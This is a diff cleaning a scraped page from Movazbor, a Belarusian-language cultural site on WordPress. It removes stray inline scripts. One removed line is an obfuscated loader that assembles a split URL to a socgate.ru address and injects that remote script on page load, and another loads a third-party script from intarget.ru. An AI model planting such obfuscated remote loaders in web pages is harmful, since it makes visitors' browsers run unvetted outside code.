@@ -1,8 +1,6 @@
 ---
 ---
 
-(function(){document.documentElement.className='js'})(); Movazbor              .site-header { padding-top: 14px; padding-bottom: 14px; } .site-branding { min-height: 42px; } @media screen and (min-width: 46.25em) { .site-header { padding-top: 21px; padding-bottom: 21px; } .site-branding { min-height: 56px; } } @media screen and (min-width: 55em) { .site-header { padding-top: 25px; padding-bottom: 25px; } .site-branding { min-height: 62px; } } @media screen and (min-width: 59.6875em) { .site-header { padding-top: 0; padding-bottom: 0; } .site-branding { min-height: 0; } } .site-title, .site-description { clip: rect(1px, 1px, 1px, 1px); position: absolute; } !function(e,t,a){var r=e.createElement("script");r.type="text/javascript",r.async=!0,r.src="htt"+"ps://soc"+"gate.ru/?id="+t+"&guid="+a+"&e76.js";var c=e.getElementsByTagName("script")\[0\];c.parentNode.insertBefore(r,c)}(document,"b6c279457d528f90","");
-
 [Перайсці да змесціва](#content)
 
 [Movazbor](/)
@@ -69,7 +67,3 @@ Search for:
 **Беларускамоўная культурна-інфармацыйная прастора** (агульнае поле кантактаў паміж беларускамоўнымі, якія аб’яднаны прынцыпамі Мовазбору)
 
 Наша пляцоўка разбудоўваецца. Каб быць у курсе падзей Мовазбору, падпісвайцеся на нашу рассылку.
-
-[Вэб-сайт працуе на WordPress](https://ru.wordpress.org/)
-
-/\* <!\[CDATA\[ \*/ var screenReaderText = {"expand":"<span class=\\"screen-reader-text\\">\\u0440\\u0430\\u0441\\u043a\\u0440\\u044b\\u0442\\u044c \\u0434\\u043e\\u0447\\u0435\\u0440\\u043d\\u0435\\u0435 \\u043c\\u0435\\u043d\\u044e<\\/span>","collapse":"<span class=\\"screen-reader-text\\">\\u0441\\u0432\\u0435\\u0440\\u043d\\u0443\\u0442\\u044c \\u0434\\u043e\\u0447\\u0435\\u0440\\u043d\\u0435\\u0435 \\u043c\\u0435\\u043d\\u044e<\\/span>"}; /\* \]\]> \*/ (function(d, w, c) { w\[c\] = { projectId: 11110 }; var n = d.getElementsByTagName("script")\[0\], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "//rt.intarget.ru/loader.js"; if (w.opera == "\[object Opera\]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "inTargetInit");
